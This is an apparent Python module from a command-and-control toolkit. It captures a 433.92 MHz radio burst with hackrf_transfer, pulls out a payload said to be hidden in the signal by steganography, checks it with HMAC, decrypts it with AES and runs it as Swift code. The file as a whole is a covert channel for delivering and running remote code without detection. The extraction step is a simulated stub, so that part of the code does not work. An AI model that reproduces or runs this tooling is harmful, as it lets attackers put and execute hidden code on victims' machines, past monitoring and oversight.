#!/usr/bin/env python3
# File: modules/c2/rf_stego_receiver.py

import os
import sys
import time
import json
import base64
import hashlib
import subprocess
from Crypto.Cipher import AES
from Crypto.Hash import HMAC, SHA256
from pathlib import Path
from datetime import datetime
import tempfile

RECEIVE_DIR = "captures/stego_signals"
PAYLOAD_OUTPUT_DIR = "payloads/received"
LOG_FILE = "logs/rf_stego_receiver.log"
KEY_FILE = "config/aes_shared_key.txt"

os.makedirs(RECEIVE_DIR, exist_ok=True)
os.makedirs(PAYLOAD_OUTPUT_DIR, exist_ok=True)
Path(LOG_FILE).parent.mkdir(parents=True, exist_ok=True)

def log(msg):
    with open(LOG_FILE, "a") as f:
        f.write(f"[{datetime.utcnow()}] {msg}\n")
    print(msg)

def listen_for_signal(duration=10, center_freq="433.92M", sample_rate="2M"):
    output_file = f"{RECEIVE_DIR}/burst_{int(time.time())}.bin"
    cmd = [
        "hackrf_transfer", "-r", output_file,
        "-f", center_freq, "-s", sample_rate,
        "-n", str(int(sample_rate.replace("M", "")) * 1_000_000 * duration)
    ]
    log(f"[+] Listening for RF stego signal: {center_freq}Hz for {duration}s")
    subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return output_file

def extract_stego_payload(signal_file):
    # Simulated extraction (replace with real demod logic)
    embedded_file = signal_file.replace(".bin", ".payload.b64")
    if os.path.exists(embedded_file):
        with open(embedded_file, "r") as f:
            return f.read()
    else:
        log("[!] No embedded payload found.")
        return None

def load_key():
    if not os.path.exists(KEY_FILE):
        raise Exception("AES key not found.")
    with open(KEY_FILE, "r") as f:
        return f.read().strip().encode()

def decrypt_payload(encoded_data, key):
    try:
        raw = base64.b64decode(encoded_data)
        iv = raw[:16]
        hmac_sig = raw[16:48]
        ciphertext = raw[48:]

        h = HMAC.new(key, ciphertext, digestmod=SHA256)
        h.verify(hmac_sig)

        cipher = AES.new(key, AES.MODE_CBC, iv)
        plaintext = cipher.decrypt(ciphertext)
        return plaintext.rstrip(b"\x00")
    except Exception as e:
        log(f"[!] Decryption or HMAC verification failed: {e}")
        return None

def execute_payload(payload_bytes):
    try:
        with tempfile.NamedTemporaryFile(delete=False, mode="wb", suffix=".swift") as f:
            f.write(payload_bytes)
            swift_file = f.name

        log(f"[+] Executing received payload: {swift_file}")
        subprocess.run(["swift", swift_file], check=True)
        os.remove(swift_file)
    except Exception as e:
        log(f"[!] Execution failed: {e}")

def store_payload(payload_bytes):
    ts = int(time.time())
    output_file = f"{PAYLOAD_OUTPUT_DIR}/payload_{ts}.swift"
    with open(output_file, "wb") as f:
        f.write(payload_bytes)
    log(f"[+] Stored decrypted payload to {output_file}")
    return output_file

def main():
    signal_file = listen_for_signal()
    encoded = extract_stego_payload(signal_file)
    if not encoded:
        return

    key = load_key()
    decrypted = decrypt_payload(encoded, key)
    if not decrypted:
        log("[!] No valid payload recovered.")
        return

    store_payload(decrypted)
    execute_payload(decrypted)

    log("[*] RF stego receiver module completed.")

if __name__ == "__main__":
    main()
